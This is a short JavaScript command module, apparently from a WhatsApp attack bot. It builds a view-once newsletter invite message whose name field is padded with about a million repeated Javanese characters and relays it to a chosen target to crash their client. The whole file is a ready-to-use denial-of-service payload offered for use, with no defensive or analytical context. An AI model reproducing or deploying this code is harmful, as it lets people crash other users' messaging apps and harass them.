// ============================================================
// BUG: crash — Newsletter invite crash
// Source: Senku — adapted
// ============================================================

export default {
  id: 'crash',
  name: 'Newsletter Crash',

  async execute({ sock, target }) {
    const msg = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '120363298524333143@newsletter',
            newsletterName: 'XWC' + 'ꦾ'.repeat(1020000),
            jpegThumbnail: '',
            caption: 'XWC',
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target },
    });
  },
};